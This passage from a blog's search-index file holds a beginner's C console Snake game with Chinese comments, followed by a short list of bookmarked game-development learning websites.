class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxy 20</span></span><br><span class="line"><span class="comment">//设置高度</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxx 30</span></span><br><span class="line"><span class="comment">//设置宽度</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">zk</span><span class="params">()</span>;<span class="comment">//制框</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;<span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printmap</span><span class="params">()</span>;<span class="comment">//打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">move</span><span class="params">()</span>;<span class="comment">//操作</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pd</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>;<span class="comment">//判断游戏结果</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">food</span><span class="params">()</span>;<span class="comment">//产生食物</span></span><br><span class="line"><span class="type">int</span> a[maxy][maxx];<span class="comment">//地图</span></span><br><span class="line"><span class="type">int</span> headx,heady;<span class="comment">//蛇头</span></span><br><span class="line"><span class="type">int</span> m;<span class="comment">//是否吃到食物</span></span><br><span class="line"><span class="type">int</span> len;<span class="comment">//蛇长</span></span><br><span class="line"><span class="type">int</span> fx;<span class="comment">//方向</span></span><br><span class="line"><span class="type">int</span> score;<span class="comment">//得分</span></span><br><span class="line"><span class="type">int</span> flag;<span class="comment">//控制游戏结束</span></span><br><span class="line"><span class="type">int</span> mm;<span class="comment">//控制食物的产生</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        zk();</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (mm)</span><br><span class="line">        &#123;</span><br><span class="line">        food();</span><br><span class="line">        mm=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">clrscr();<span class="comment">//清屏</span></span><br><span class="line">move();       <span class="comment">//移动</span></span><br><span class="line">printmap();  <span class="comment">//打印图</span></span><br><span class="line">usleep(<span class="number">333333</span>);<span class="comment">//延迟</span></span><br><span class="line">&#125;<span class="keyword">while</span> (flag);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按任意键开始新游戏。。&quot;</span>);</span><br><span class="line">getch();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>   <span class="comment">//初始化</span></span><br><span class="line">&#123;</span><br><span class="line">headx=maxx/<span class="number">2</span><span class="number">-5</span>;heady=maxy/<span class="number">2</span>;</span><br><span class="line">a[heady][headx]=<span class="number">1</span>;</span><br><span class="line">a[heady][headx<span class="number">-1</span>]=<span class="number">2</span>;</span><br><span class="line">a[heady][headx<span class="number">-2</span>]=<span class="number">3</span>;</span><br><span class="line">m=<span class="number">0</span>;</span><br><span class="line">len=<span class="number">3</span>;</span><br><span class="line">fx=<span class="number">6</span>;</span><br><span class="line">score=<span class="number">0</span>;</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">mm=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">zk</span><span class="params">()</span><span class="comment">//边界地图</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;maxy;i++)</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;maxx;j++)</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>||i==maxy<span class="number">-1</span>||j==<span class="number">0</span>||j==maxx<span class="number">-1</span>)</span><br><span class="line"> a[i][j]=<span class="number">-2</span>;<span class="comment">//边界</span></span><br><span class="line"> <span class="keyword">else</span> a[i][j]=<span class="number">0</span>;<span class="comment">//内部</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printmap</span><span class="params">()</span><span class="comment">//打印</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;maxy;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;maxx;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i][j]==<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47m  \033[0m&quot;</span>);<span class="comment">//空白</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[i][j]&gt;<span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31;42m哈\033[0m&quot;</span>);<span class="comment">//蛇身</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a[i][j]==<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34;45m头\033[0m&quot;</span>);<span class="comment">//蛇头</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[i][j]==<span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33;47m🍄 \033[0m&quot;</span>);<span class="comment">//食物</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[43m  \033[0m&quot;</span>);<span class="comment">//边界</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31;47mlen:%5d    score:%5d\033[0m\n&quot;</span>,len,score);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">food</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> i,j,count=<span class="number">0</span>,kk;</span><br><span class="line">  srand(time(<span class="literal">NULL</span>));<span class="comment">//随机产生食物</span></span><br><span class="line">  kk=rand()%((maxx<span class="number">-2</span>)*(maxy<span class="number">-2</span>)-len<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;maxy<span class="number">-1</span>;i++)</span><br><span class="line">  <span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;maxx<span class="number">-1</span>;j++)</span><br><span class="line">    <span class="keyword">if</span> (a[i][j]==<span class="number">0</span>)<span class="comment">//空白处</span></span><br><span class="line">   &#123;</span><br><span class="line">   count++;</span><br><span class="line">   <span class="keyword">if</span> (count==kk)</span><br><span class="line">   &#123;</span><br><span class="line">    a[i][j]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">move</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> nn=fx;</span><br><span class="line"><span class="keyword">while</span> (kbhit())<span class="comment">//判断键盘有无输入</span></span><br><span class="line"><span class="comment">//修改，if-&gt;while</span></span><br><span class="line">nn=getch()<span class="number">-48</span>;<span class="comment">//若有，由getch()读入</span></span><br><span class="line"><span class="keyword">if</span> (fx+nn!=<span class="number">10</span>)<span class="comment">//防止倒退致死</span></span><br><span class="line"><span class="keyword">switch</span>(nn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:pd(<span class="number">0</span>,<span class="number">-1</span>);fx=<span class="number">2</span>;<span class="keyword">break</span>;<span class="comment">//蛇头上移</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:pd(<span class="number">-1</span>,<span class="number">0</span>);fx=<span class="number">4</span>;<span class="keyword">break</span>;<span class="comment">//蛇头左移</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:pd(<span class="number">1</span>,<span class="number">0</span>);fx=<span class="number">6</span>;<span class="keyword">break</span>;<span class="comment">//蛇头右移</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:pd(<span class="number">0</span>,<span class="number">1</span>);fx=<span class="number">8</span>;<span class="keyword">break</span>;<span class="comment">//蛇头下移</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:getch();<span class="comment">//暂停，按任意键继续</span></span><br><span class="line"><span class="keyword">default</span>:<span class="keyword">break</span>;<span class="comment">//暂停游戏</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pd</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line">headx=headx+x;</span><br><span class="line">heady=heady+y;</span><br><span class="line"><span class="keyword">if</span> (a[heady][headx]==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">        m=<span class="number">1</span>;</span><br><span class="line">        len++;</span><br><span class="line">        mm=<span class="number">1</span>;</span><br><span class="line">        score=score+<span class="number">5</span>+(len%<span class="number">3</span>);<span class="comment">//计分</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a[heady][headx]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GAME OVER!\n&quot;</span>);<span class="comment">//游戏结束</span></span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;maxy<span class="number">-1</span>;i++)</span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;maxx<span class="number">-1</span>;j++)</span><br><span class="line">            <span class="keyword">if</span>(a[i][j]&gt;=<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                a[i][j]++;<span class="comment">//蛇尾移动</span></span><br><span class="line">                <span class="keyword">if</span> (a[i][j]==len+<span class="number">1</span>&amp;&amp;m==<span class="number">0</span>)</span><br><span class="line">                a[i][j]=<span class="number">0</span>;<span class="comment">//没吃到食物，尾巴要移动</span></span><br><span class="line">            &#125;</span><br><span class="line">m=<span class="number">0</span>;</span><br><span class="line">a[heady][headx]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>游戏开发学习网页收藏</title>
      <link href="/2018/08/18/notes/website/"/>
      <url>/2018/08/18/notes/website/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000</a></p><p><a href="https://github.com/github">https://github.com/github</a></p><p><a href="https://www.csdn.net/">https://www.csdn.net/</a></p><p><a href="https://www.csdn.net/nav/game">https://www.csdn.net/nav/game</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
